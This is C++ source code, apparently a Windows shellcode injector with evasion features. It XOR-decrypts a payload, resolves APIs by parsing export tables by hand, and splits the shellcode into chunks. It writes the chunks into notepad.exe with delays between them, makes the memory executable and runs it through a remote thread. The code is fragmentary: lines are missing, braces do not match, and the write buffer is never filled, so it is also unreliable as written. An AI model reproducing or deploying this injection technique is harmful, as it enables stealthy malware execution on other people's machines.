// --- Simple XOR encrypt/decrypt function ---
void xor_encrypt_decrypt(unsigned char* data, size_t data_len, const char* key) {
  size_t key_len = strlen(key);
  for (size_t i = 0; i < data_len; i++) {
    data[i] ^= key[i % key_len];
  }
}

// --- Manually parse EAT to get function address with SEH protection ---
FARPROC GetSymbolAddress(HMODULE hModule, const char* targetName) {
  PBYTE base = (PBYTE)hModule;
  __try {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
      return NULL;
    }
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);
    DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportDirRVA == 0) {
      return NULL;
    }
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirRVA);
    PDWORD names = (PDWORD)(base + exportDir->AddressOfNames);
    PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
    PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
      char* name = (char*)(base + names[i]);
      if (strcmp(name, targetName) == 0) {
        return (FARPROC)(base + functions[ordinals[i]]);
      }
    }
  }
  __except (EXCEPTION_EXECUTE_HANDLER) {
    return NULL;
  }
  return NULL;
}

    std::cout << "[-] Notepad.exe not found." << std::endl;
    return -1;

  HANDLE hProcess = new_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    return -1;

  const size_t num_parts = 3;  // Adjust as needed

  for (size_t i = 0; i < num_parts; ++i) {
    size_t this_size = (i == num_parts - 1) ? (shellcode_size - offset) : chunk_size;
    parts[i].resize(this_size);
    memcpy(parts[i].data(), shellcode + offset, this_size);
    offset += this_size;
  }

  std::vector<LPVOID> positions(num_parts);
  const size_t jump_size = 12;  // For x64: mov rax, addr (10 bytes) + jmp rax (2 bytes)
  for (size_t i = 0; i < num_parts; ++i) {
    size_t alloc_size = parts[i].size();
    if (i < num_parts - 1) alloc_size += jump_size;
    positions[i] = new_VirtualAllocEx(hProcess, NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (positions[i] == NULL) {
      std::cout << "[-] Failed to allocate remote memory for part " << i << std::endl;
      delete[] shellcode;
      new_CloseHandle(hProcess);
      return -1;
    }
    std::cout << "[*] Allocated part " << i << " at: " << positions[i] << std::endl;

  for (size_t i = 0; i < num_parts; ++i) {
    size_t this_size = parts[i].size();
    std::vector<unsigned char> buffer(this_size);

    SIZE_T bytes_written;
    if (!new_WriteProcessMemory(hProcess, positions[i], buffer.data(), this_size, &bytes_written)) {
      std::cout << "[-] Failed to write part " << i << std::endl;
      delete[] shellcode;
      new_CloseHandle(hProcess);
      return -1;
    }
    std::cout << "[*] Wrote part " << i << " (" << this_size << " bytes)" << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(3));  // Sleep between writes
  }

  // --- Change protections to RX for each part ---
  for (size_t i = 0; i < num_parts; ++i) {
    size_t this_size = parts[i].size() + (i < num_parts - 1 ? jump_size : 0);
    DWORD old_protect;
    if (!new_VirtualProtectEx(hProcess, positions[i], this_size, PAGE_EXECUTE_READ, &old_protect)) {
      std::cout << "[-] Failed to protect part " << i << std::endl;
      delete[] shellcode;
      new_CloseHandle(hProcess);
      return -1;
    }
  }

  // --- Create remote thread at first part ---
  HANDLE hThread = new_CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)positions[0], NULL, 0, NULL);
  if (hThread == NULL) {
    std::cout << "[-] Failed to create remote thread." << std::endl;
    delete[] shellcode;
    new_CloseHandle(hProcess);
    return -1;
  }

  std::cout << "[+] Executing chained shellcode in notepad.exe!" << std::endl;
  WaitForSingleObject(hThread, INFINITE);
  new_CloseHandle(hThread);
  new_CloseHandle(hProcess);
  delete[] shellcode;

  return 0;
}
